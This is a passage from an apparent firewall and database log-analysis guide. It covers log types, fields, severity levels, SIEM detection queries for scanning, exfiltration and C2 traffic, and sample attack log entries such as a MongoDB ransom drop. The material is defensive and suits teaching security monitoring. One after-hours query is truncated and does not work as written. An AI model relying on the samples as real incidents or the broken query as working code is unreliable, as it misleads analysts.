customer collection. Ransom Attack: Database Dropped {"atype":"dropDatabase","ts":{"$date":"2025-07-14T10:04:55.229+00:00"},"remote":{"ip":"203.0.113.44","port":52190},"users":[],"roles":[],"param":{"ns":"shopdb"},"result":0} {"t":{"$date":"2025-07-14T10:05:01.882+00:00"},"s":"I","c":"COMMAND","id":51803,"ctx":"conn8419","msg":"Slow query","attr":{"type":"command","ns":"READ__ME_TO_RECOVER_YOUR_DATA.Warning","command":{"insert":"Warning"},"remote":"203.0.113.44:52190"}} An empty users array on the dropDatabase record proves the operation was unauthenticated. The ransom note database created seconds later completes the pattern that has hit tens of thousands of exposed instances. Unauthorized Access Attempt (Code 13) {"t":{"$date":"2025-07-14T10:09:14.006+00:00"},"s":"I","c":"ACCESS","id":20436,"ctx":"conn8433","msg":"Checking authorization failed","attr":{"error":{"code":13,"codeName":"Unauthorized","errmsg":"not authorized on hrdb to execute command { find: \"employees\", filter: {} }"},"remote":"10.30.2.61:52240"}} An authenticated but under-privileged account probing a collection it cannot read. A burst of code 13 events across many namespaces is systematic privilege mapping after a credential compromise. Back

Firewall logs are critical security artifacts that document network traffic decisions made by the firewall. These logs capture essential data including source and destination IP addresses, ports, protocols, traffic direction, timestamp information, and the action taken (allow, deny, drop). This detailed record enables security teams to monitor network boundaries and investigate potential security incidents. Most enterprise firewalls generate several log types: traffic logs that record connection attempts, threat logs that document detected threats and attacks, and system logs that track firewall operational events such as configuration changes, administrator logins, and system status. Log formats vary by vendor but typically include CSV, Syslog, or proprietary formats that can be exported to SIEM systems. To effectively utilize firewall logs, organizations should implement proper log retention policies, configure detailed logging parameters, and integrate logs with security analytics platforms. Firewall logs are invaluable for detecting malicious activities such as port scanning, connection attempts to prohibited services, data exfiltration, and botnet command-and-control traffic. They also provide crucial evidence for incident response investigations, help demonstrate regulatory compliance, and support network troubleshooting efforts. Different firewall vendors may use slightly different terminology, but the core log components generally serve the same security monitoring functions. These logs can be stored locally on the firewall or forwarded to centralized logging systems such as SIEMs, log servers, or cloud-based analytics platforms for long-term storage and advanced correlation analysis.

Enterprise firewalls generate several types of logs that serve different security monitoring and analysis purposes. Understanding these log types is essential for effective security operations: Log Type Description Traffic Logs Records all connection attempts through the firewall, including source/destination IP addresses, ports, protocols, bytes transferred, and the action taken (allow, drop, reject). These logs form the foundation of network traffic analysis and policy enforcement verification. Threat Logs Documents detected threats, attacks, and security violations identified by threat prevention features. Includes malware detection, intrusion prevention alerts, vulnerability exploits, command-and-control traffic, and other malicious activities with threat severity ratings. System Logs Tracks firewall operational events such as system startup/shutdown, configuration changes, administrator logins/logouts, hardware status, high availability events, and system resource utilization. Critical for troubleshooting and maintaining audit trails of administrative actions. Data Filtering Logs Records content inspection events such as file blocking, data pattern matches, URL filtering, and application control actions. These logs help monitor data exfiltration attempts, policy violations, and potentially dangerous file transfers. Authentication Logs Documents authentication events for VPN connections, captive portals, and administrative access. Contains usernames, authentication methods used, success/failure status, and session information for user activity tracking and access control monitoring. VPN Logs Tracks virtual private network connections, including tunnel establishment, termination, encryption negotiation, and client connectivity issues. Essential for monitoring remote access security and troubleshooting connection problems. Debug Logs Provides detailed diagnostic information for troubleshooting firewall issues. Contains verbose information about packet processing, policy evaluation, and system operations. Typically only enabled temporarily during problem resolution due to high volume. Audit Logs Records administrator activities and configuration changes made to the firewall, including policy modifications, object changes, and administrative logins. Essential for compliance requirements and for tracking unauthorized administrative actions. Pro Tip: Modern Next-Generation Firewalls (NGFW) combine traditional packet filtering with deep packet inspection, application awareness, and integrated threat intelligence

Firewall logs typically contain structured fields that provide detailed information about network traffic and security events. Understanding these fields is crucial for effective log analysis: Field Description Category Example Value timestamp Date and time when the event occurred Timestamp 2025-04-23 14:32:15 src_ip Source IP address of the connection Source 203.0.113.45 src_port Source port number of the connection Source 52437 dst_ip Destination IP address of the connection Destination 192.168.10.25 dst_port Destination port number of the connection Destination 443 protocol Network protocol used in the connection Protocol TCP action Action taken by the firewall Response DENY rule_id Identifier of the firewall rule that matched Policy rule-156 bytes_sent Number of bytes sent in the connection Traffic 2348 bytes_received Number of bytes received in the connection Traffic 14852 session_duration Duration of the connection in seconds Performance 34 app_category Application category identified by the firewall Application File-sharing threat_name Name of detected threat (if applicable) Security Nmap-ScanDetected severity Severity level of the event Security High interface Network interface where traffic was observed Network eth0/outside session_id Unique identifier for the traffic session Session 12345678 nat_src_ip Source IP after NAT translation NAT 198.51.100.2 nat_dst_ip Destination IP after NAT translation NAT 10.0.0.15 country Country associated with the source IP Geolocation United States user Username associated with the connection Identity john.doe Note: The exact fields available may vary by firewall vendor and model. Some enterprise firewalls offer hundreds of potential log fields that can be enabled or disabled based on monitoring requirements.

Firewall logs are typically categorized by severity levels to help prioritize security events and filter logs for analysis. Understanding these severity levels is crucial for effective incident response: Severity Level Description Example Events Critical The most severe level, indicating events that require immediate attention. These events often represent active attacks or severe system issues that could compromise the security or functionality of the network. Successful exploitation attempts, malware infections, firewall system failures, bypass attacks, critical policy violations High Significant security events that should be investigated promptly. These events indicate potentially malicious activity but may not be as immediately threatening as critical events. Multiple failed login attempts, vulnerability exploitation attempts, detection of known malicious IP addresses, botnet command and control traffic Medium Security events of moderate concern that should be reviewed but may not require immediate action. These events often indicate suspicious activity that needs investigation. Port scans, access attempts to restricted services, policy violations, connections to suspicious domains Low Minor security events that may be benign but could be part of a larger pattern of malicious activity. These events should be monitored for pattern analysis. Single failed login attempts, connections to non-standard ports, minor policy violations, anomalous but not clearly malicious traffic patterns Informational Normal operational events that do not indicate security issues. These logs provide context for network activity and are useful for auditing and troubleshooting. Successful authentication events, normal connection establishments, policy rule matches, system status messages Debug/Verbose Detailed technical information used primarily for troubleshooting. These logs provide maximum visibility but generate high volumes of data that can be overwhelming. Packet processing details, protocol negotiations, detailed system operations, configuration parameter information Best Practice: Configure your SIEM or log management system to trigger alerts for Critical and High severity events, schedule regular reviews for Medium severity events, and use Low and Informational events for contextual analysis during investigations.

Use these generic SIEM queries to analyze firewall logs, detect threats, and uncover suspicious network activity patterns. Top Blocked Source IPs SIEM> source="firewall" action="deny" OR action="block" | stats count by src_ip | sort -count Identifies source IPs with the most blocked connection attempts, helpful for detecting scanning or brute force attacks. Unusual Destination Ports SIEM> source="firewall" NOT dst_port IN (80, 443, 22, 53, 25, 21) | stats count by dst_port, dst_ip | sort -count Shows connections to uncommon ports, useful for detecting backdoor communications or unusual services. Port Scanning Detection SIEM> source="firewall" | stats dc(dst_port) as unique_ports by src_ip | where unique_ports > 15 Identifies IPs connecting to a large number of different ports, classic sign of port scanning activity. Outbound Connection Spikes SIEM> source="firewall" direction="outbound" | bucket span=1h | stats count by src_ip, _time | where count > 1000 Detects internal IPs initiating unusually high numbers of outbound connections, potential data exfiltration or C2 traffic. High-Risk Connections SIEM> source="firewall" severity="high" OR severity="critical" | stats count by src_ip, threat_name | sort -count Highlights connections flagged with high-severity threat indicators, prioritizes critical security events. After-Hours VPN Connections SIEM> source="firewall" app_category="vpn" | where _time.hour() >= 22 OR _time.hour() Identifies VPN connections outside business hours, potential account compromise or unauthorized access. Geographically Unusual Access SIEM> source="firewall" action="allow" | lookup geoip src_ip | where NOT Country IN ("Saudi Arabia") | stats count by Country, src_ip Lists connections from unusual countries, helps detect geographic anomalies based on your organization's normal traffic patterns. Authentication Failure Patterns SIEM> source="firewall" event_type="authentication" status="failure" | stats count by src_ip, user | where count > 5 Detects repeated authentication failures, potential brute force attempts against VPN or administrative interfaces. Traffic to Malicious Domains SIEM> source="firewall" | lookup threat_intelligence domain as dst_hostname | where threat_category="malware" OR threat_category="c2" | stats count by src_ip, dst_hostname, threat_category Identifies connections to known malicious domains by cross-referencing with threat intelligence feeds.

s.h: Best Practices for Firewall Log Management
s.t: Follow these practices to enhance visibility, improve threat detection, and support security investigations using firewall logs: 01 Enable Comprehensive Logging Configure your firewall to log all critical event types including traffic flows, threats, administrative actions, and authentication attempts for complete visibility. 02 Centralize Log Collection Implement centralized log collection using syslog, SIEM connectors, or dedicated log servers to ensure all firewall logs are aggregated for unified analysis. 03 Synchronize Timestamps Configure all firewalls and network devices to use NTP for time synchronization, ensuring accurate event correlation and timeline reconstruction during investigations. 04 Implement Log Rotation Set up log rotation policies based on size and time thresholds to prevent storage issues while maintaining sufficient historical data for trend analysis. 05 Establish Baseline Patterns Document normal network traffic patterns and create baseline profiles for different times of day, enabling faster anomaly detection and reducing false positives. 06 Configure Alerting Rules Develop and implement alerting rules for high-risk events such as multiple connection denials, unusual geographic access, and suspicious outbound connections.

Understanding how different security events appear in firewall logs helps analysts identify and investigate potential threats. Below are examples of common firewall log entries in different formats: Traffic Denied by Access Control Rule Apr 25 15:23:46 firewall-01 CEF:0|FortiNet|FortiGate|7.0.0|traffic|Traffic Denied|6|deviceExternalId=FGT60F4Q16000000 rt=1714152226000 src=198.51.100.45 dst=10.0.3.25 srcport=49832 dstport=22 proto=TCP deviceInboundInterface="port1" deviceOutboundInterface="port3" type=deny rule="Block SSH" msg="Connection blocked by firewall policy" act=deny This log shows a blocked SSH connection attempt (TCP port 22) from an external IP (198.51.100.45) to an internal server (10.0.3.25), denied by a rule named "Block SSH". Suspicious Port Scanning Detection Apr 25 14:05:37 paloalto-fw1 1,2025/04/25 14:05:37,007200001234,THREAT,scan,1,2025/04/25 14:05:37,203.0.113.88,192.168.1.0/24,0.0.0.0,0.0.0.0,PortScan,nmap,any,1,2025/04/25 14:05:30,2025/04/25 14:05:37,tcp,alert,"Port scanning detected",0,0x0,Russia,192.168.1.0-192.168.1.255,(null),high,critical-threat-category,0,0,0,0,,panos This Palo Alto Networks log entry shows a detected port scan from a Russian IP address (203.0.113.88) targeting an internal subnet (192.168.1.0/24), identified as an Nmap scan with high severity. Malware Detection in HTTP Traffic Apr 25 16:42:18 cisco-asa-fw %ASA-3-430003: FilterDesc: Malware detected from 172.16.5.12:54932 to 93.184.216.34:80, Malicious File: "invoice_april2025.doc" Action: blocked, ThreatID: Win.Trojan.AgentTesla, ThreatCategory: Trojan, severity: high This log entry from a Cisco ASA firewall shows the detection and blocking of a malicious Word document ("invoice_april2025.doc") containing the AgentTesla trojan during an HTTP download. Successful VPN Authentication Apr 25 08:15:33 checkpoint-fw 2025-04-25T08:15:33.456Z CORPORATE-FW VPN [INFO] Authentication succeeded for user john.doe from 198.51.100.89 using certificate authentication. Session ID: VPN12345678, Tunnel established: ESP, Encryption: AES-256, Integrity: SHA-256 This Check Point firewall log shows a successful VPN authentication using certificate-based authentication for user john.doe connecting from 198.51.100.89. Administrator Configuration Change Apr 25 11:32:45 fortinet-fw1 date=2025-04-25 time=11:32:45 devname="FG100E" devid="FG100E0000000001" logid="0100044546" type="event" subtype="system" level="notice" vd="root" logdesc="Object attribute configured" user="admin" ui="Web" action="Edit" cfgtid=1234567890 cfgpath="firewall policy" cfgobj="Rule-42" cfgattr="action" cfgval="deny" msg="User admin changed firewall policy Rule-42 attribute 'action' to 'deny'" This FortiGate firewall log entry shows an administrator (admin) modifying a firewall rule (Rule-42) through the web interface, changing the action from allow to deny. Data Loss Prevention (DLP) Alert Apr 25 13:47:22 pan-fw1 1,2025/04/25 13:47:22,015100005678,THREAT,file,1,2025/04/25 13:47:22,10.5.2.18,203.0.113.100,10.5.2.18,203.0.113.100,DLP-Alert,email-attachment,smtp,vsys1,internal,external,2025/04/25 13:47:22,62548,1,53048,25,0,0,0x0,tcp,alert,"Credit card numbers detected in attachment",SensitiveData.xlsx,medium,client-to-server,567392,0x80000000,United States,United States,0,,1,,,"palo-alto" This Palo Alto Networks log shows a Data Loss Prevention (DLP) alert triggered when an employee (10.5.2.18) attempted to send an Excel file containing credit card numbers via email to an external recipient (203.0.113.100).
